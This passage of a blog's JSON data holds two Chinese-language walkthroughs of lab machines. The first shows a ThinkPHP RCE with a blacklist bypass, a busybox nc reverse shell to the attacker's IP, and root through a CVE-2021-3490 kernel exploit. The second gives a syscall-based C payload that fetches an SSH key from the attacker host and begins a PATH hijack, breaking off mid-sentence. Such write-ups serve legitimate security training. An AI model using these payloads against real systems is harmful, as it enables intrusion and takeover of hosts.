 <p>\u8fd9\u662f\u4e00\u4e2a\u4f7f\u7528ThinkPHP\u6784\u5efa\u7684\u8d5b\u535a\u670b\u514b\u98ce\u683c\u7684RCE\u3002</p>\n    ...\n</body>\n```\n\n\u9875\u9762\u660e\u786e\u6307\u51fa\u8be5\u5e94\u7528\u662f\u4f7f\u7528 **ThinkPHP** \u6846\u67b6\u6784\u5efa\u7684\u3002\n\n## 2. \u76ee\u5f55\u4e0e\u6f0f\u6d1e\u626b\u63cf\n\n\u4f7f\u7528 `gobuster` \u8fdb\u884c\u76ee\u5f55\u626b\u63cf\uff0c\u53d1\u73b0\u5927\u91cf\u6587\u4ef6\uff0c\u4f46\u4fe1\u606f\u8f83\u4e3a\u6742\u4e71\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.131:8080 -w ...\n...\n/index.php            (Status: 200) [Size: 2295]\n/robots.txt           (Status: 200) [Size: 24]\n/system.zip           (Status: 200) [Size: 22]\n...\n```\n\n\u4f7f\u7528 `nuclei` \u8fdb\u884c\u81ea\u52a8\u5316\u6f0f\u6d1e\u626b\u63cf\uff0c\u53d1\u73b0 `phpinfo.php` \u6cc4\u9732\u548c `.gitignore` \u6587\u4ef6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nuclei -u http://192.168.205.131:8080\n...\n[phpinfo-files] [http] [low] http://192.168.205.131:8080/phpinfo.php ...\n[exposed-gitignore] [http] [info] http://192.168.205.131:8080/.gitignore\n...\n```\n\n\u8bbf\u95ee `.gitignore` \u6587\u4ef6\uff0c\u53d1\u73b0\u4e86\u4e00\u4e9b\u88ab\u6392\u9664\u5728\u7248\u672c\u63a7\u5236\u4e4b\u5916\u7684\u8def\u5f84\u548c\u6587\u4ef6\uff0c\u5982 `.env` \u548c `/vendor` \u76ee\u5f55\uff0c\u8fd9\u4e9b\u901a\u5e38\u5305\u542b\u654f\u611f\u4fe1\u606f\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.131:8080/.gitignore          \n*.log\n.env\ncomposer.phar\n...\n/vendor\n...\n```\n\n\u5c1d\u8bd5\u8bbf\u95ee `.env` \u6587\u4ef6\uff0c\u867d\u7136\u6ca1\u6709\u76f4\u63a5\u83b7\u53d6\u5230\u914d\u7f6e\u4fe1\u606f\uff0c\u4f46\u8fd4\u56de\u7684\u9519\u8bef\u9875\u9762\u66b4\u9732\u4e86\u6846\u67b6\u7684\u8be6\u7ec6\u7248\u672c\uff1a**ThinkPHP V8.1.3**\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.131:8080/.env\n...\n<div class='copyright'>\n    <a title='\u5b98\u65b9\u7f51\u7ad9' href='http://www.thinkphp.cn'>ThinkPHP</a> \n    <span>V8.1.3</span> \n    ...\n</div>\n...\n```\n\n## 3. Git\u6e90\u7801\u6cc4\u9732\n\n\u4f7f\u7528 `dirsearch` \u8fdb\u4e00\u6b65\u626b\u63cf\uff0c\u786e\u8ba4\u4e86 `.git` \u76ee\u5f55\u7684\u5b58\u5728\uff0c\u8fd9\u610f\u5473\u7740\u7f51\u7ad9\u6e90\u7801\u53ef\u80fd\u88ab\u6cc4\u9732\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ dirsearch -u http://192.168.205.131:8080  \n...\n[20:35:40] 301 -  324B  - /.git  ->  http://192.168.205.131:8080/.git/\n...\n```\n\n\u4f7f\u7528 `git-dumper` \u5de5\u5177\u5c06\u6cc4\u9732\u7684 `.git` \u4ed3\u5e93\u5b8c\u6574\u4e0b\u8f7d\u5230\u672c\u5730\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ git-dumper http://192.168.205.131:8080/ .                \n...\n[-] Running git checkout .\n\u4ece\u7d22\u5f15\u533a\u66f4\u65b0\u4e86 71 \u4e2a\u8def\u5f84\n```\n\n## 4. \u4ee3\u7801\u5ba1\u8ba1\n\n\u4e0b\u8f7d\u6e90\u7801\u540e\uff0c\u5bf9\u5173\u952e\u6587\u4ef6\u8fdb\u884c\u5ba1\u8ba1\uff0c\u5bfb\u627e\u6f0f\u6d1e\u3002\n\n* **`app/admin/controller/Admin.php`**:\n  \u5728 `Admin` \u63a7\u5236\u5668\u4e2d\u53d1\u73b0\u4e00\u4e2a `hello` \u65b9\u6cd5\uff0c\u5176\u6838\u5fc3\u4ee3\u7801\u4e3a `call_user_func($b, $a);`\u3002\u8fd9\u662f\u4e00\u4e2a\u5178\u578b\u7684\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u5176\u4e2d\u53c2\u6570 `$a` \u548c `$b` \u5747\u53ef\u901a\u8fc7URL\u4f20\u5165\uff0c\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u8c03\u7528\u7684\u51fd\u6570\uff08`$b`\uff09\u548c\u5176\u53c2\u6570\uff08`$a`\uff09\u3002\n\n  ```php\n  public function hello($a,$b)\n  {\n      call_user_func($b, $a); // \u6f0f\u6d1e\u70b9\n  }\n  ```\n\n* **`app/admin/route/app.php`**:\n  \u8def\u7531\u6587\u4ef6\u663e\u793a\uff0c`sb/:a/:b` \u8def\u5f84\u88ab\u7ed1\u5b9a\u5230\u4e86 `Admin/hello` \u65b9\u6cd5\u3002\u5f00\u53d1\u8005\u6ce8\u91ca\u201c\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u6211\u8fd9\u4e2a\u8def\u7531\u662f\u65e0\u6548\u7684\u201d\uff0c\u4f46\u5b9e\u9645\u4e0a\uff0c\u7531\u4e8e\u5e94\u7528\u6620\u5c04\u7684\u914d\u7f6e (`'app_map' => ['think'=>'admin']`)\uff0c\u8bbf\u95ee\u8def\u5f84\u5e94\u4e3a `/think/admin/hello/...`\u3002\n\n  ```php\n  Route::rule('sb/:a/:b','Admin/hello');\n  ```\n\n* **`app/middleware/Check1.php`**:\n  `Admin` \u63a7\u5236\u5668\u4f7f\u7528\u4e86 `Check1` \u4e2d\u95f4\u4ef6\uff0c\u5b83\u4f1a\u6821\u9a8c `Session` \u4e2d\u7684 `sb` \u548c `token` \u662f\u5426\u76f8\u7b49\u4e14\u4e0d\u4e3a\u7a7a\uff0c\u8fd9\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u8eab\u4efd\u9a8c\u8bc1\u3002\n\n  ```php\n  if ((Session::get('sb')==Session::get('token')&&!empty(Session::get('sb'))&&!empty(Session::get('token')))){\n      return $next($request);\n  }\n  ```\n\n* **`app/middleware/Check.php`**:\n  \u5b58\u5728\u4e00\u4e2a\u5168\u5c40\u4e2d\u95f4\u4ef6\uff0c\u901a\u8fc7\u9ed1\u540d\u5355\u6b63\u5219\u8fc7\u6ee4URL\u4e2d\u7684\u5371\u9669\u51fd\u6570\uff0c\u5982 `system`, `exec`, `eval` \u7b49\u3002\u4f46 `passthru` \u7b49\u51fd\u6570\u5e76\u672a\u5728\u9ed1\u540d\u5355\u4e2d\uff0c\u53ef\u4ee5\u7ed5\u8fc7\u3002\n\n  ```php\n  $pattern = '/\\b(eval|exec|system|...|phpinfo)\\b/i';\n  ```\n\n# \u4e09\u3001\u6f0f\u6d1e\u5229\u7528\n\n## 1. \u83b7\u53d6Token\n\n\u6839\u636e\u4ee3\u7801\u5ba1\u8ba1\uff0c\u9700\u8981\u5148\u83b7\u53d6\u4e00\u4e2a\u5408\u6cd5\u7684 `token` \u624d\u80fd\u8bbf\u95ee\u540e\u53f0\u63a7\u5236\u5668\u3002`app/index/controller/Token.php` \u6587\u4ef6\u903b\u8f91\u663e\u793a\uff0c\u5411 `/index.php/index/token/token` \u53d1\u9001 `sb=admin` \u7684POST\u8bf7\u6c42\u5373\u53ef\u83b7\u5f97`token`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl http://192.168.205.131:8080/index.php/index/token/token -d 'sb=admin' -c cookie.txt\n...\n<p class='message'>\u83b7\u53d6\u6210\u529f: 2fce588f94d6d5edcfea90156254f130a4aed575</p>\n...\n```\n\n## 2. RCE\u6267\u884c\u547d\u4ee4\n\n\u643a\u5e26\u4e0a\u4e00\u6b65\u83b7\u53d6\u7684`cookie`\uff0c\u6784\u9020Payload\u8bbf\u95ee\u6f0f\u6d1e\u8def\u7531\u3002\u6211\u4eec\u4f7f\u7528 `passthru` \u51fd\u6570\u7ed5\u8fc7\u9ed1\u540d\u5355\u68c0\u6d4b\uff0c\u6267\u884c `id` \u547d\u4ee4\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl http://192.168.205.131:8080/think/admin/hello/a/id/b/passthru -b cookie.txt\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n\u547d\u4ee4\u6210\u529f\u6267\u884c\uff0c\u5f53\u524d\u7528\u6237\u4e3a `www-data`\u3002\n\n## 3. \u53cd\u5f39Shell\n\n\u5728\u672c\u5730\u76d1\u542c\u7aef\u53e3\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lvnp 8888                        \nlistening on [any] 8888 ...\n```\n\n\u6784\u9020\u53cd\u5f39Shell\u7684Payload\uff0c\u5e76\u8fdb\u884cURL\u7f16\u7801\u540e\u53d1\u9001\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl http://192.168.205.131:8080/think/admin/hello/a/busybox%20nc%20192%2E168%2E205%2E128%208888%20%2De%20bash/b/passthru -b cookie.txt\n```\n\n\u6210\u529f\u63a5\u6536\u5230\u53cd\u5f39Shell\uff0c\u5e76\u4f7f\u7528`script`\u548c`stty`\u7b49\u547d\u4ee4\u5347\u7ea7\u4e3a\u4ea4\u4e92\u5f0fTTY\u3002\n\n# \u56db\u3001\u6743\u9650\u63d0\u5347\n\n## 1. \u7528\u6237\u5207\u6362\n\n\u5728 `/home` \u76ee\u5f55\u4e0b\u53d1\u73b0 `welcome` \u7528\u6237\uff0c\u5e76\u5728\u5176\u5bb6\u76ee\u5f55\u4e2d\u627e\u5230\u4e00\u4e2a\u540d\u4e3a `.pwd` \u7684\u53ef\u7591\u6587\u4ef6\uff0c\u8fd9\u53ef\u80fd\u662f\u4e00\u4e2a\u5bc6\u7801\u5b57\u5178\u3002\n\n```bash\nwww-data@tpN:/home/welcome$ ls -al\n...\n-rw-r--r-- 1 root    root    3510 Jul 22 09:56 .pwd\n-rw-r--r-- 1 root    root      26 Jul 24 09:27 uesr.txt\n```\n\n\u5c06`suForce`\u4e0a\u4f20\u5230\u76ee\u6807\u670d\u52a1\u5668\uff0c\u5e76\u4f7f\u7528`suForce`\u5de5\u5177\u8fdb\u884c\u7206\u7834\u3002\n\n```bash\nwww-data@tpN:/tmp$ ./suForce -u welcome -w pass\n...\n\ud83d\udca5 Password | eecho\n...\n```\n\n\u6210\u529f\u7206\u7834\u51fa `welcome` \u7528\u6237\u7684\u5bc6\u7801\u4e3a `eecho`\u3002\u5207\u6362\u7528\u6237\u6210\u529f\u3002\n\n```bash\nwww-data@tpN:/tmp$ su welcome\nPassword: eecho\nwelcome@tpN:/tmp$ id\nuid=1000(welcome) gid=1000(welcome) groups=1000(welcome)\n```\n\n## 2. \u5185\u6838\u6f0f\u6d1e\u63d0\u6743\n\n\u5207\u6362\u5230 `welcome` \u7528\u6237\u540e\uff0c\u6267\u884c `sudo -l` \u53d1\u73b0\u6ca1\u6709sudo\u6743\u9650\u3002\u4e0a\u4f20\u5e76\u8fd0\u884c `linpeas.sh` \u811a\u672c\u8fdb\u884c\u63d0\u6743\u6f0f\u6d1e\u626b\u63cf\uff0c\u53d1\u73b0\u7cfb\u7edf\u5185\u6838\u53ef\u80fd\u5b58\u5728 **CVE-2021-3490** \u6f0f\u6d1e\u3002\n\n```bash\n...\n[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops\n   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story\n   Exposure: probable\n...\n```\n\n\u4e0b\u8f7d\u5e76\u7f16\u8bd1\u8be5\u6f0f\u6d1e\u7684exploit\u3002\n\n```bash\nwelcome@tpN:/tmp$ busybox wget https://.../CVE-2021-3490/zip/main\nwelcome@tpN:/tmp$ unzip main \nwelcome@tpN:/tmp/Linux_LPE_eBPF_CVE-2021-3490-main$ make\ngcc -DGROOVY -o bin/exploit.bin -I include/ exploit.c bpf.c kmem_search.c\n```\n\n\u6267\u884cexploit\uff0c\u6210\u529f\u83b7\u53d6root\u6743\u9650\u3002\n\n```bash\nwelcome@tpN:/tmp/Linux_LPE_eBPF_CVE-2021-3490-main/bin$ ./exploit.bin \n...\n[!] preparing to overwrite creds...\n[+] success! enjoy r00t :)\n# id\nuid=0(root) gid=0(root) groups=0(root),1000(welcome)\n```\n\n# \u4e94\u3001\u593a\u53d6Flag\n\n\u5728root\u6743\u9650\u4e0b\uff0c\u8bfb\u53d6\u7528\u6237\u548croot\u7684flag\u3002\n\n```bash\nroot@tpN:/# cat /root/root.txt /home/welcome/uesr.txt \nflag{root-\u4e0d\u9519\u4e0d\u9519}\nflag{user-eecho123456789}\n```\n\n\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1755307513, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-16", "dateLabelColor": "#0969da"}, "P216": {"htmlDir": "docs/post/nei-bu-_Sysadmin.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Sysadmin", "postUrl": "post/nei-bu-_Sysadmin.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/216", "commentNum": 0, "wordCount": 7122, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## **1. \u4e3b\u673a\u53d1\u73b0\u4e0e\u7aef\u53e3\u626b\u63cf**\n\n\u9996\u5148\uff0c\u5728\u672c\u5730\u7f51\u7edc\u4e2d\u5229\u7528 `arp-scan` \u626b\u63cf\u5b58\u6d3b\u4e3b\u673a\uff0c\u5b9a\u4f4d\u76ee\u6807IP\u3002\u968f\u540e\uff0c\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u5176\u5f00\u653e\u7684\u7aef\u53e3\u4e0e\u670d\u52a1\u3002\n\n**\u4e3b\u673a\u53d1\u73b0:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.145 08:00:27:8f:61:6e       PCS Systemtechnik GmbH\n...\n```\n\n\u901a\u8fc7ARP\u626b\u63cf\uff0c\u786e\u8ba4\u76ee\u6807\u4e3b\u673a\u7684IP\u5730\u5740\u4e3a `192.168.205.145`\u3002\n\n**\u7aef\u53e3\u626b\u63cf:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p0-65535 192.168.205.145\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 22:40 EDT\nNmap scan report for 192.168.205.145\nHost is up (0.00026s latency).\nNot shown: 65534 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:8F:61:6E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.21 seconds\n```\n\nNmap\u7684\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0c\u76ee\u6807\u4e3b\u673a\u5bf9\u5916\u5f00\u653e\u4e86 **22 (SSH)** \u548c **80 (HTTP)** \u4e24\u4e2aTCP\u7aef\u53e3\u3002\n\n# **\u4e8c\u3001\u6f0f\u6d1e\u53d1\u73b0\u4e0e\u521d\u59cb\u8bbf\u95ee**\n\n## **1. Web\u670d\u52a1\u4fa6\u5bdf\u4e0e\u6f0f\u6d1e\u5206\u6790**\n\n\u901a\u8fc7\u6d4f\u89c8\u5668\u8bbf\u95ee `http://192.168.205.145`\uff0c\u53d1\u73b0\u4e00\u4e2a\u63d0\u4f9bC\u8bed\u8a00\u5728\u7ebf\u7f16\u8bd1\u548c\u6267\u884c\u529f\u80fd\u7684Web\u5e94\u7528\u3002\u901a\u8fc7\u5ba1\u67e5\u9875\u9762\u6e90\u4ee3\u7801\u6ce8\u91ca\uff0c\u6211\u4eec\u83b7\u53d6\u4e86\u5176\u540e\u7aef\u7684\u7f16\u8bd1\u6307\u4ee4\uff1a\n\n```\ngcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out\n```\n\n\u6b64\u7f16\u8bd1\u547d\u4ee4\u4e2d\u5305\u542b\u4e00\u4e2a\u5173\u952e\u53c2\u6570 `-nostdinc`\u3002\u8be5\u53c2\u6570\u7684\u4f5c\u7528\u662f\u963b\u6b62\u7f16\u8bd1\u5668\u94fe\u63a5\u4efb\u4f55\u6807\u51c6\u5e93\u7684\u5934\u6587\u4ef6\uff08\u4f8b\u5982 `stdio.h`, `unistd.h` \u7b49\uff09\u3002\u8fd9\u610f\u5473\u7740\uff0c\u6240\u6709\u4f9d\u8d56\u6807\u51c6\u5e93\u51fd\u6570\uff08\u5982 `system()`, `fork()`, `execve()`\uff09\u7684\u5e38\u89c4\u53cd\u5f39Shell Payload\u5747\u4f1a\u56e0\u94fe\u63a5\u5931\u8d25\u800c\u65e0\u6cd5\u901a\u8fc7\u7f16\u8bd1\uff0c\u5e38\u89c4\u7684\u653b\u51fb\u65b9\u5f0f\u5728\u6b64\u5904\u5931\u6548\u3002\n\n## **2. \u7ed5\u8fc7\u7f16\u8bd1\u9650\u5236\u83b7\u53d6Shell**\n\n\u4e3a\u4e86\u6210\u529f\u7ed5\u8fc7 `-nostdinc` \u53c2\u6570\u5e26\u6765\u7684\u9650\u5236\uff0c\u6211\u4eec\u4e0d\u80fd\u4f9d\u8d56C\u8bed\u8a00\u7684\u5e93\u51fd\u6570\uff0c\u800c\u5fc5\u987b\u8f6c\u5411\u66f4\u5e95\u5c42\u7684\u5b9e\u73b0\u65b9\u5f0f\uff1a\u901a\u8fc7\u5185\u8054\u6c47\u7f16\u76f4\u63a5\u6267\u884c\u7cfb\u7edf\u8c03\u7528\uff08syscall\uff09\u3002\n\n**\u653b\u51fb\u601d\u8def\u5982\u4e0b\uff1a**\n\u6784\u9020\u4e00\u4e2a\u7279\u6b8a\u7684C\u8bed\u8a00Payload\uff0c\u5176\u6838\u5fc3\u662f\u5229\u7528\u5185\u8054\u6c47\u7f16\u76f4\u63a5\u8c03\u7528 `execve` \u7cfb\u7edf\u8c03\u7528\u6765\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\u8be5\u547d\u4ee4\u5c06\u6307\u793a\u76ee\u6807\u670d\u52a1\u5668\u4ece\u6211\u4eec\u7684\u653b\u51fb\u673a\u4e0a\u4e0b\u8f7d\u9884\u5148\u51c6\u5907\u597d\u7684SSH\u516c\u94a5\uff0c\u5e76\u5c06\u5176\u5199\u5165\u76ee\u6807\u7528\u6237 `echo` \u7684 `~/.ssh/authorized_keys` \u6587\u4ef6\u4e2d\uff0c\u4ece\u800c\u4e3a\u6211\u4eec\u5efa\u7acb\u4e00\u4e2a\u6301\u4e45\u5316\u7684SSH\u514d\u5bc6\u767b\u5f55\u901a\u9053\u3002\uff08\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\uff0cSublarge\u8bbe\u7f6e\u4e86timeout 3s\uff0c\u6240\u4ee5\u5c3d\u91cf\u5199authorized_keys\uff0c\u6216\u8005\u4f7f\u7528Sublarge\u7684\u601d\u8def\uff09\n\n*ps:Sublarge\u7684\u529e\u6cd5\u5728\u6587\u672b*\n\n**Payload (`exploit.c`):**\n\n```c\nlong syscall(long num, long p1, long p2, long p3);\n\nint main() {\n    char *sh = '/bin/bash';\n    char *arg1 = 'bash';\n    char *arg2 = '-c';\n    char *cmd = 'mkdir -p ~/.ssh && busybox wget http://192.168.205.128/authorized_keys -O ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys && busybox wget http://192.168.205.128:80?$(whoami)';\n\n    const long SYS_EXECVE = 59;\n\n    \n    char *argv[] = {arg1, arg2, cmd, 0};\n\n    syscall(SYS_EXECVE, (long)sh, (long)argv, 0);\n\n    \n    while(1) {\n        syscall(37, 0, 0, 0);\n    }\n\n    return 0;\n}\n\nlong syscall(long num, long p1, long p2, long p3) {\n    long ret;\n    __asm__ volatile (\n        'movq %1, %%rax\\n'\n        'movq %2, %%rdi\\n'\n        'movq %3, %%rsi\\n'\n        'movq %4, %%rdx\\n'\n        'syscall\\n'\n        'movq %%rax, %0\\n'\n        : '=m'(ret)\n        : 'm'(num), 'm'(p1), 'm'(p2), 'm'(p3)\n        : 'rax', 'rdi', 'rsi', 'rdx'\n    );\n    return ret;\n}\n```\n\n**\u6267\u884c\u6b65\u9aa4\uff1a**\n\n1. \u5728\u653b\u51fb\u673a\uff08`192.168.205.128`\uff09\u4e0a\u751f\u6210SSH\u5bc6\u94a5\u5bf9\uff0c\u5c06\u516c\u94a5\u5185\u5bb9\u4fdd\u5b58\u4e3a `authorized_keys` \u6587\u4ef6\uff0c\u5e76\u4e8e\u6587\u4ef6\u6240\u5728\u76ee\u5f55\u542f\u52a8\u4e00\u4e2a\u4e34\u65f6\u7684HTTP\u670d\u52a1\u3002\n\n   ```bash\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n   \u2514\u2500$ python3 -m http.server 80\n   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n   ```\n\n2. \u5c06\u4e0a\u8ff0 `exploit.c` \u7684\u4ee3\u7801\u7c98\u8d34\u5230\u76ee\u6807Web\u5e94\u7528\u7684\u8f93\u5165\u6846\u4e2d\uff0c\u5e76\u63d0\u4ea4\u6267\u884c\u3002\n\n3. \u89c2\u5bdf\u653b\u51fb\u673a\u4e0aHTTP\u670d\u52a1\u7684\u65e5\u5fd7\uff0c\u786e\u8ba4\u6587\u4ef6\u4e0b\u8f7d\u548c\u547d\u4ee4\u6267\u884c\u60c5\u51b5\u3002\n\n   ```\n   192.168.205.145 - - [14/Aug/2025 23:06:01] 'GET /authorized_keys HTTP/1.1' 200 -\n   192.168.205.145 - - [14/Aug/2025 23:06:01] 'GET /?echo HTTP/1.1' 404 -\n   ```\n\n   \u65e5\u5fd7\u6e05\u6670\u5730\u663e\u793a\uff0c\u76ee\u6807\u4e3b\u673a\u9996\u5148\u6210\u529f\u8bf7\u6c42\u4e86 `authorized_keys` \u6587\u4ef6\u3002\u968f\u540e\uff0c\u7b2c\u4e8c\u4e2a\u8bf7\u6c42\u7684\u8def\u5f84\u4e2d\u5305\u542b\u4e86 `echo` \u5b57\u7b26\u4e32\uff0c\u8fd9\u662f `whoami` \u547d\u4ee4\u6267\u884c\u7ed3\u679c\u7684\u56de\u663e\uff0c\u4ece\u800c\u786e\u8ba4\u4e86Web\u670d\u52a1\u7684\u8fd0\u884c\u7528\u6237\u4e3a `echo`\u3002\n\n## **3. \u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6743\u9650**\n\n\u65e2\u7136SSH\u516c\u94a5\u5df2\u6210\u529f\u90e8\u7f72\u5230\u76ee\u6807\u4e3b\u673a `echo` \u7528\u6237\u7684\u5bb6\u4e2d\uff0c\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5bf9\u5e94\u7684\u79c1\u94a5\u76f4\u63a5\u8fdb\u884cSSH\u767b\u5f55\u3002\n\n```bash\nssh echo@192.168.205.145\n```\n\n\u6210\u529f\u767b\u5f55\u540e\uff0c\u901a\u8fc7 `id` \u547d\u4ee4\u9a8c\u8bc1\u5f53\u524d\u7528\u6237\u8eab\u4efd\u3002\n\n```bash\necho@Sysadmin:~$ id\nuid=1000(echo) gid=1000(echo) groups=1000(echo)\n```\n\n\u81f3\u6b64\uff0c\u6211\u4eec\u5df2\u6210\u529f\u83b7\u53d6\u4e86\u7528\u6237 `echo` \u7684\u4ea4\u4e92\u5f0fShell\uff0c\u5b8c\u6210\u4e86\u521d\u59cb\u8bbf\u95ee\u3002\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## **1. Sudo\u6743\u9650\u679a\u4e3e**\n\n\u5728\u83b7\u5f97\u521d\u59cb\u7acb\u8db3\u70b9\u540e\uff0c\u9996\u8981\u4efb\u52a1\u662f\u63a2\u67e5\u662f\u5426\u5b58\u5728\u6743\u9650\u63d0\u5347\u7684\u8def\u5f84\u3002\u6211\u4eec\u68c0\u67e5\u5f53\u524d\u7528\u6237 `echo` \u7684 `sudo` \u914d\u7f6e\u3002\n\n```bash\necho@Sysadmin:~$ sudo -l\nMatching Defaults entries for echo on Sysadmin:\n    !env_reset, mail_badpass, !env_reset, always_set_home\n\nUser echo may run the following commands on Sysadmin:\n    (root) NOPASSWD: /usr/local/bin/system-info.sh\n```\n\n`sudo -l` \u7684\u8f93\u51fa\u63ed\u793a\u4e86\u5173\u952e\u4fe1\u606f\uff1a\n\n1.  **`!env_reset`**\uff1a\u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u91cd\u8981\u7684\u5b89\u5168\u914d\u7f6e\u3002\u5b83\u544a\u77e5\u6211\u4eec\uff0c\u5f53 `echo` \u7528\u6237\u4f7f\u7528 `sudo` \u6267\u884c\u547d\u4ee4\u65f6\uff0c\u7cfb\u7edf**\u4e0d\u4f1a**\u91cd\u7f6e\u5927\u90e8\u5206\u7528\u6237\u7684\u73af\u5883\u53d8\u91cf\uff0c\u5176\u4e2d\u5c31\u5305\u62ec `PATH` \u73af\u5883\u53d8\u91cf\u3002\u8fd9\u4e2a\u7279\u6027\u662f\u672c\u6b21\u63d0\u6743\u6f0f\u6d1e\u7684\u6838\u5fc3\u3002\n2.  **(root) NOPASSWD: /usr/local/bin/system-info.sh**\uff1a\u7528\u6237 `echo` \u53ef\u4ee5\u65e0\u9700\u5bc6\u7801\uff0c\u4ee5 `root` \u6743\u9650\u6267\u884c `/usr/local/bin/system-info.sh` \u8fd9\u4e2a\u811a\u672c\u3002\n\n## **2. PATH\u73af\u5883\u53d8\u91cf\u52ab\u6301**\n\n\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5ba1\u8ba1\u8be5\u811a\u672c\u7684\u6e90\u4ee3\u7801\uff0c\u4ee5\u5206\u6790\u662f\u5426\u5b58\u5728\u53ef\u5229\u7528\u7684\u7f3a\u9677\u3002\n\n```bash\necho@Sysadmin:~$ cat /usr/local/bin/system-info.sh\n#!/bin/bash\n#===================================\n# Daily System Info Report\n#===================================\necho 'Starting daily system information collection at $(date)'\necho '------------------------------------------------------'\necho 'Checking disk usage...'\ndf -h\necho 'Checking log directory...'\nls -lh /var/log/\nfind /var/log/ -type f -name '*.gz' -mtime +30 -exec rm {} \\;\necho 'Checking critical services...'\nsystemctl is-active sshd\nsystemctl is-active cron\necho 'Collecting CPU and memory information...'\ncat /proc/cpuinfo\nfree -m\necho '------------------------------------------------------'\necho 'Report complete at $(date)'\n```\n\n\u4ee3\u7801\u5ba1\u8ba1\u53d1\u73b0\uff0c\u811a\u672c\u4e2d\u8c03\u7528\u7684 `df`, `ls`, `find`, `systemctl`, `cat`, `free` \u7b49\u4e00\u7cfb\u5217\u547d\u4ee4\u5747\u672a\u4f7f\u7528\u5176\u7edd\u5bf9\u8def\u5f84\uff08\u5982 `/bin/df`\uff09\uff0c\u800c\u662f\u76f4\u63a5\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\u3002\u7ed3\u5408\u524d\u8ff0\u7684 `!env_reset` \u914d\u7f6e\uff0c\u4e00\u4e2a\u7ecf\u5178\u7684**PATH\u73af\u5883\u53d8\u91cf\u52ab\u6301**\u653b\u51fb\u8def\u5f84\u5c31\u6b64\u5f62\u6210\u3002\u5f53\u811a\u672c\u4ee5 `root` \u6743\u9650\u8fd0\u884c\u65f6\uff0c\u5b83\u4f1a\u4f9d\u636e `echo` \u7528\u6237\u81ea\u5b9a\u4e49\u7684 `PATH` \u73af\u5883\u53d8\u91cf\u6765\u67e5\u627e\u8fd9\u4e9b\u547d\u4ee4\u3002\n\n## **3. \u63d0\u6743\u81f3Root**\n\n**\u653b\u51fb\u6b65\u9aa4\uff1a**\n\n1. \u9996\u5148\uff0c\u5728 `echo` \u7528\u6237\u7684\u5bb6\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a `df` \u7684\u6076\u610f\u811a\u672c\u3002\u6211\u4eec\u7684\u76ee\u6807\u662f\u5229\u7528 `root` \u6743\u9650\u4e3a `/bin/bash` \u7a0b\u5e8f\u8d4b\u4e88SUID\u6743\u9650\u4f4d\uff0c\u4ece\u800c\u521b\u5efa\u4e00\u4e2a 'root 